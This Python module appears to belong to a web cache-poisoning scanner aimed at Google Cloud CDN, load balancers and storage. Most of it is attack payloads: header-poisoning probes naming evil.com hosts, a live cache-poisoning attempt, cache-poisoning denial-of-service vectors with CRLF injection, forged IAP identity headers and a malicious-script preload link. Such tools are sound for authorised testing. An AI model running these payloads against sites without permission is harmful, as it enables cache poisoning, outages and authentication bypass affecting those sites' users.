#!/usr/bin/env python3
from utils.style import Colors
from utils.utils import configure_logger, random, requests

logger = configure_logger(__name__)


def gcp_cdn_debug_headers(url: str, s: requests.Session) -> None:
    """
    Test Google Cloud CDN cache-control directives and debug signals.
    GCP CDN respects CDN-Cache-Control and Cache-Control directives from origin.
    GFE debug headers can leak internal routing, backend info and cache state.
    """
    debug_headers = [
        {"X-Google-Cache-Control": "no-cache"},
        {"X-GFE-Debug": "1"},
        {"X-Google-Debug": "1"},
        {"X-Google-GFE-Request-Trace": "1"},
        {"X-Google-Shellfish-Status": "1"},
        {"X-GFE-SSL": "error"},
        {"X-Google-No-Cache": "1"},
        {"X-Google-Backend-Timing": "1"},
        {"X-Google-Netmon-Label": "1"},
        {"X-Google-Service": "1"},
    ]
    interesting_keys = [
        "x-google", "x-gfe", "x-goog", "x-cache",
        "x-cloud", "via", "server-timing", "age",
        "alt-svc", "x-served-by", "x-backend",
    ]
    seen = set()
    try:
        for h in debug_headers:
            req = s.get(url, headers=h, verify=False, timeout=10)
            for rh in req.headers:
                if any(k in rh.lower() for k in interesting_keys):
                    pair = (rh.lower(), req.headers[rh])
                    if pair not in seen:
                        seen.add(pair)
                        header_name = list(h.keys())[0]
                        print(
                            f"{Colors.CYAN}   └── [{header_name}] {rh}: {req.headers[rh]}{Colors.RESET}"
                        )
    except Exception as e:
        logger.exception(e)


def gcp_cdn_cache_key_test(url: str, s: requests.Session) -> None:
    """
    Google Cloud CDN uses the full URL (scheme + host + path + query) as cache key by default.
    Custom cache keys can exclude query params, headers or cookies.
    Test if unkeyed headers can poison the cache.
    """
    probe_value = f"bycodejump{random.randrange(9999)}"
    unkeyed_candidates = [
        {"X-Forwarded-For": f"127.0.0.1, {probe_value}"},
        {"X-Forwarded-Host": f"{probe_value}.evil.com"},
        {"X-Real-IP": "127.0.0.1"},
        {"Via": f"1.1 {probe_value}"},
        {"X-Google-Real-IP": "127.0.0.1"},
        {"X-Original-URL": f"/{probe_value}"},
        {"X-Rewrite-URL": f"/{probe_value}"},
        {"X-Forwarded-Scheme": "nothttps"},
        {"X-Original-Host": f"{probe_value}.evil.com"},
        {"X-HTTP-Method-Override": "POST"},
        {"X-Forwarded-Port": "1337"},
        {"Forwarded": f"for={probe_value};proto=http"},
        {"CDN-Loop": probe_value},
        {"X-Custom-Header": probe_value},
    ]
    try:
        baseline = s.get(
            f"{url}?cb={random.randrange(9999)}", verify=False, timeout=10
        )
        for h in unkeyed_candidates:
            uri = f"{url}?cb={random.randrange(9999)}"
            req = s.get(
                uri, headers=h, verify=False, timeout=10, allow_redirects=False
            )
            val = list(h.values())[0]
            header_name = list(h.keys())[0]

            # Check reflection in body
            if probe_value in req.text:
                print(
                    f"{Colors.GREEN}   └── [REFLECTION] {header_name}: {val} reflected in body – potential CP vector{Colors.RESET}"
                )
            # Check reflection in response headers
            for rh_name, rh_val in req.headers.items():
                if probe_value in rh_val:
                    print(
                        f"{Colors.GREEN}   └── [HEADER REFLECTION] {header_name} reflected in response header {rh_name}{Colors.RESET}"
                    )
                    break
            # Check status code diff
            if req.status_code != baseline.status_code:
                print(
                    f"{Colors.YELLOW}   └── [BEHAVIOR] {header_name} -> {baseline.status_code} > {req.status_code}{Colors.RESET}"
                )
            # Check significant size diff (potential error page / different content)
            size_diff = abs(len(req.content) - len(baseline.content))
            if size_diff > 100 and req.status_code == baseline.status_code:
                print(
                    f"{Colors.YELLOW}   └── [SIZE DIFF] {header_name} -> baseline {len(baseline.content)}b vs {len(req.content)}b (Δ{size_diff}b){Colors.RESET}"
                )
    except Exception as e:
        logger.exception(e)


def gcp_cdn_cache_poisoning_verify(url: str, s: requests.Session) -> None:
    """
    Attempt actual cache poisoning via GCP CDN.
    Send a poisoned request then verify if a clean request returns poisoned content.
    """
    probe = f"bycj-cp-{random.randrange(9999)}"
    poison_headers = [
        {"X-Forwarded-Host": f"{probe}.evil.com"},
        {"X-Forwarded-Scheme": "nothttps"},
        {"X-Original-URL": f"/{probe}"},
        {"X-Forwarded-Proto": "nothttps"},
    ]
    try:
        for h in poison_headers:
            cache_buster = f"cptest{random.randrange(99999)}"
            uri = f"{url}?cb={cache_buster}"
            header_name = list(h.keys())[0]

            # Step 1: Send poisoned request
            s.get(uri, headers=h, verify=False, timeout=10, allow_redirects=False)

            # Step 2: Verify with clean request
            verify = s.get(uri, verify=False, timeout=10, allow_redirects=False)

            if probe in verify.text:
                print(
                    f"{Colors.RED}   └── [CACHE POISON CONFIRMED] {header_name} -> probe '{probe}' found in clean response{Colors.RESET}"
                )
            elif verify.status_code in (301, 302, 303, 307, 308):
                location = verify.headers.get("Location", "")
                if probe in location:
                    print(
                        f"{Colors.RED}   └── [CACHE POISON REDIRECT] {header_name} -> poisoned Location: {location}{Colors.RESET}"
                    )
    except Exception as e:
        logger.exception(e)


def gcp_loadbalancer_headers(url: str, s: requests.Session) -> None:
    """
    Google Cloud Load Balancer specific header injection tests.
    GCLB adds X-Forwarded-For, X-Forwarded-Proto and can be abused
    when these are trusted blindly by the backend.
    https://cloud.google.com/load-balancing/docs/https#target-proxies
    """
    probe = f"bycodejump{random.randrange(9999)}"
    headers = [
        {"X-Client-Geo-Location": f"{probe},FR"},
        {"X-Forwarded-Proto": "nohttps"},
        {"X-Cloud-Trace-Context": probe},
        {"X-Goog-Authenticated-User-Email": f"{probe}@test.iam.gserviceaccount.com"},
        {"X-Goog-Authenticated-User-ID": probe},
        {"X-Goog-IAP-JWT-Assertion": probe},
        {"X-Serverless-Authorization": f"Bearer {probe}"},
        {"X-Google-Internal-Skipadmincheck": "1"},
        {"X-Google-Serverless-Encoding": probe},
        {"X-AppEngine-Country": "US"},
        {"X-AppEngine-Region": probe},
        {"X-AppEngine-City": probe},
        {"X-AppEngine-CityLatLong": "0.0,0.0"},
        {"X-Goog-Request-Params": probe},
    ]
    try:
        baseline = s.get(
            f"{url}?cb={random.randrange(9999)}", verify=False, timeout=10
        )
        for h in headers:
            uri = f"{url}?cb={random.randrange(9999)}"
            req = s.get(
                uri, headers=h, verify=False, timeout=10, allow_redirects=False
            )
            header_name = list(h.keys())[0]
            val = list(h.values())[0]
            status_info = f"{req.status_code} [{len(req.content)}b]"

            if probe in req.text:
                print(
                    f"{Colors.GREEN}   └── {header_name} -> {status_info} [REFLECTED]{Colors.RESET}"
                )
            elif req.status_code != baseline.status_code:
                print(
                    f"{Colors.YELLOW}   └── {header_name} -> {status_info} [STATUS DIFF: {baseline.status_code} > {req.status_code}]{Colors.RESET}"
                )
            else:
                size_diff = abs(len(req.content) - len(baseline.content))
                if size_diff > 50:
                    print(
                        f"{Colors.YELLOW}   └── {header_name} -> {status_info} [SIZE DIFF: Δ{size_diff}b]{Colors.RESET}"
                    )
    except Exception as e:
        logger.exception(e)


def gcp_cpdos_test(url: str, s: requests.Session) -> None:
    """
    Cache Poisoning Denial of Service (CPDoS) against GCP CDN.
    Try to cache error responses via oversized headers, bad methods, or malformed requests.
    """
    cpdos_vectors = [
        ("HHO", {"X-Oversized": "A" * 8200}),
        ("HMC", None),  # HTTP Method Confusion -> uses custom method
        ("HMO", {"X-HTTP-Method-Override": "DELETE"}),
        ("Meta-Char", {"X-Inject": "test\r\nX-Injected: true"}),
        ("Transfer-Encoding", {"Transfer-Encoding": "chunked, identity"}),
        ("Content-Length", {"Content-Length": "99999"}),
        ("Content-Type", {"Content-Type": "text/html, application/json, invalid/type"}),
        ("Accept-Encoding", {"Accept-Encoding": "gzip, deflate, br, invalid"}),
        ("Range", {"Range": "bytes=cow"}),
    ]
    try:
        for name, headers in cpdos_vectors:
            cache_buster = f"cpdos{random.randrange(99999)}"
            uri = f"{url}?cb={cache_buster}"

            if name == "HMC":
                try:
                    req = s.request(
                        "PURGE", uri, verify=False, timeout=10, allow_redirects=False
                    )
                except Exception:
                    continue
            else:
                req = s.get(
                    uri, headers=headers, verify=False, timeout=10, allow_redirects=False
                )

            if req.status_code >= 400:
                # Verify if error is cached
                verify = s.get(uri, verify=False, timeout=10, allow_redirects=False)
                if verify.status_code >= 400:
                    print(
                        f"{Colors.RED}   └── [CPDoS-{name}] Error {req.status_code} cached! Verify: {verify.status_code}{Colors.RESET}"
                    )
                else:
                    print(
                        f"{Colors.YELLOW}   └── [CPDoS-{name}] Error {req.status_code} triggered but not cached{Colors.RESET}"
                    )
    except Exception as e:
        logger.exception(e)


def gcp_early_hints_test(url: str, s: requests.Session) -> None:
    """
    Test for Early Hints (103) abuse via GCP infrastructure.
    If the backend returns 103 with Link headers, poisoning these could preload malicious resources.
    """
    probe = f"bycodejump{random.randrange(9999)}"
    headers = [
        {"X-Forwarded-Host": f"{probe}.evil.com"},
        {"Link": f"<https://{probe}.evil.com/malicious.js>; rel=preload; as=script"},
    ]
    try:
        for h in headers:
            uri = f"{url}?cb={random.randrange(9999)}"
            req = s.get(uri, headers=h, verify=False, timeout=10, allow_redirects=False)
            link_header = req.headers.get("Link", "")
            if probe in link_header:
                print(
                    f"{Colors.RED}   └── [EARLY HINTS] {list(h.keys())[0]} reflected in Link header: {link_header}{Colors.RESET}"
                )
    except Exception as e:
        logger.exception(e)


def gcp_storage_misconfig_test(url: str, s: requests.Session) -> None:
    """
    Test for GCS bucket misconfigurations when the target is served from Google Cloud Storage.
    Check for directory listing, CORS misconfiguration, and ACL exposure.
    """
    try:
        # Detect if served from GCS
        probe = s.get(url, verify=False, timeout=10)
        is_gcs = any(
            h.startswith("x-goog-") for h in (k.lower() for k in probe.headers)
        )
        if not is_gcs:
            return

        # Test CORS with wildcard origin
        evil_origin = "https://evil.com"
        cors_req = s.get(
            url,
            headers={"Origin": evil_origin},
            verify=False,
            timeout=10,
        )
        acao = cors_req.headers.get("Access-Control-Allow-Origin", "")
        if evil_origin in acao or acao == "*":
            print(
                f"{Colors.RED}   └── [GCS CORS] Wildcard or reflected ACAO: {acao}{Colors.RESET}"
            )

        acac = cors_req.headers.get("Access-Control-Allow-Credentials", "")
        if acac.lower() == "true" and (evil_origin in acao or acao == "*"):
            print(
                f"{Colors.RED}   └── [GCS CORS+CREDS] ACAO reflects origin + Allow-Credentials: true{Colors.RESET}"
            )

        # Check storage class / metageneration for info leaks
        meta_gen = probe.headers.get("x-goog-metageneration", "")
        storage_class = probe.headers.get("x-goog-storage-class", "")
        if meta_gen or storage_class:
            print(
                f"{Colors.CYAN}   └── [GCS INFO] storage-class: {storage_class}, metageneration: {meta_gen}{Colors.RESET}"
            )
    except Exception as e:
        logger.exception(e)


def gcp(url: str, s: requests.Session) -> None:
    """
    Google Cloud CDN / Cloud Load Balancer / GCS analysis.
    Signatures: Via: 1.1 google, X-Google-Cache, Age header from GFE,
    Server: Google Frontend / ESF, x-goog-* response headers.
    https://cloud.google.com/cdn/docs
    """
    gcp_cdn_debug_headers(url, s)
    gcp_cdn_cache_key_test(url, s)
    gcp_cdn_cache_poisoning_verify(url, s)
    gcp_loadbalancer_headers(url, s)
    gcp_cpdos_test(url, s)
    gcp_early_hints_test(url, s)
    gcp_storage_misconfig_test(url, s)